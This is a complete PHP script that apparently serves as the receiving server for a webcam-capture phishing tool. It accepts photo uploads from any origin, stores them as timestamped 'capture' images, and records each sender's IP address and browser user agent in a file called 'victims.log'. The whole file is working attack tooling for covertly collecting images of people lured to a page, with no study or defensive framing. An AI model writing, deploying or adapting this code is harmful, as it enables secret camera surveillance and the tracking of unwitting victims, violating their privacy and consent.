<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: *');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    
    $upload_dir = __DIR__ . '/files/cam/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    $timestamp = time();
    $random = bin2hex(random_bytes(4));
    $filename = "capture_{$timestamp}_{$random}.jpg";
    $filepath = $upload_dir . $filename;
    
    if (move_uploaded_file($_FILES['photo']['tmp_name'], $filepath)) {
        chmod($filepath, 0644);
        
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $log = sprintf(
            "[%s] %s | IP: %s | UA: %s\n",
            date('Y-m-d H:i:s'),
            $filename,
            $ip,
            substr($user_agent, 0, 50)
        );
        
        file_put_contents('victims.log', $log, FILE_APPEND | LOCK_EX);
        
        http_response_code(200);
        echo 'SUCCESS';
        exit;
    }
}

http_response_code(400);
echo 'ERROR';
?>
